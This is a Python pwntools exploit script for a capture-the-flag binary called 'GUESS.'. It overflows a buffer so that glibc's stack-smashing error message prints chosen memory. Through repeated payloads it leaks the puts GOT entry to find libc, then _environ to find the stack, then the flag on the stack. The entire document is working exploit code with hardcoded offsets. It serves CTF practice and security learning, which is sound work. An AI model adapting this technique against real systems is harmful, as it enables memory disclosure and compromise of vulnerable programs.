from pwn import *
#context.log_level = 'debug'

puts_got = 0x602020
p = process('./GUESS.')

#leak libc
p.recvuntil('guessing flag\n')
payload = 'a'*0x128 + p64(puts_got)
p.sendline(payload)
p.recvuntil('detected ***: ')
puts_addr = u64(p.recv(6).ljust(8,'\x00'))
log.success('puts addr : 0x%x' %puts_addr)
#gdb.attach(p)
offset_puts = 0x000000000006f690
libc_base = puts_addr - offset_puts
log.success('libc base addr : 0x%x' %libc_base)

offset__environ = 0x00000000003c6f38
_environ_addr = libc_base + offset__environ
log.success('_environ addr : 0x%x' %_environ_addr)

#leak stack
p.recvuntil('guessing flag\n')
payload = 'a'*0x128 + p64(_environ_addr)
p.sendline(payload)
p.recvuntil('detected ***: ')
stack_base = u64(p.recv(6).ljust(8,'\x00')) - 0x198
log.success('stack base addr : 0x%x' %stack_base)
flag_addr = stack_base + 0x30

#leak flag
p.recvuntil('guessing flag\n')
payload = 'a'*0x128 + p64(flag_addr)
p.sendline(payload)
p.recvuntil('detected ***: ')
flag = p.recvuntil('}')
print flag

p.interactive()